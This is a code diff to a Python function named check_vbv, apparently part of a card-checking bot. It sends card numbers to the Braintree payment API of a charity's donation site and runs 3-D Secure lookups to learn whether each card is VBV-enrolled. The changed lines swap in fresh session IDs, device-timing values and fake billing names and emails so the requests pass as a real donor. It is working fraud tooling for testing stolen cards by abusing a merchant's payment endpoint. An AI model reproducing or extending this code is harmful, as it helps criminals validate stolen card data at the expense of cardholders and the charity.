@@ -201,7 +201,7 @@ def check_vbv(cc, exp, exy, cvc, bot, cmd):
     "Accept-Language": "en-US,en;q=0.5",
     "Accept-Encoding": "gzip, deflate, br",
     "Content-Type": "application/json;charset=UTF-8",
-    "X-Cardinal-Tid": "Tid-1c8af1e5-bf49-4c72-b6f9-7b0e8979c6f9",
+    "X-Cardinal-Tid": "Tid-5d0dfb04-8f89-4630-87a5-5fcd6ed34405",
     "Content-Length": "700",
     "Origin": "https://www.rspb.org.uk",
     "Referer": "https://www.rspb.org.uk/",
@@ -242,7 +242,7 @@ def check_vbv(cc, exp, exy, cvc, bot, cmd):
             bin = response.json()["data"]["tokenizeCreditCard"]["creditCard"]["bin"]
             first, second = get_name_rand()
             lookup_url = f"https://api.braintreegateway.com/merchants/dhc3zqgx778795nf/client_api/v1/payment_methods/{tok}/three_d_secure/lookup"
-            lookup_payload = {"amount":5,"additionalInfo":{"billingPostalCode":"BS3 1PL","billingGivenName":"Jack","billingSurname":"Smith","email":"pireb51444@abatido.com"},"bin":"544544","dfReferenceId":"0_0d4b8a72-beb6-40d9-979c-1afc8b59e197","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.97.2","cardinalDeviceDataCollectionTimeElapsed":16,"issuerDeviceDataCollectionTimeElapsed":421,"issuerDeviceDataCollectionResult":True},"authorizationFingerprint":f"{authorizationFingerprint}","braintreeLibraryVersion":"braintree/web/3.97.2","_meta":{"merchantAppId":"www.rspb.org.uk","platform":"web","sdkVersion":"3.97.2","source":"client","integration":"custom","integrationType":"custom","sessionId":"5b9253ac-e41b-4e43-b392-776d9ad813c7"}}
+            lookup_payload = {"amount":5,"additionalInfo":{"billingPostalCode":"S12 3HU","billingGivenName":"Faruk","billingSurname":"Devid","email":"smithfoden233@gmail.com"},"bin":"523441","dfReferenceId":"0_c39af110-dca3-4201-adfc-d39d32e288dd","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.97.2","cardinalDeviceDataCollectionTimeElapsed":339,"issuerDeviceDataCollectionTimeElapsed":5067,"issuerDeviceDataCollectionResult":True},"authorizationFingerprint":f"{authorizationFingerprint}","braintreeLibraryVersion":"braintree/web/3.97.2","_meta":{"merchantAppId":"www.rspb.org.uk","platform":"web","sdkVersion":"3.97.2","source":"client","integration":"custom","integrationType":"custom","sessionId":"894f97cf-246e-4233-8039-6197ab657d62"}}
             #print(lookup_payload)
 
             headers = {
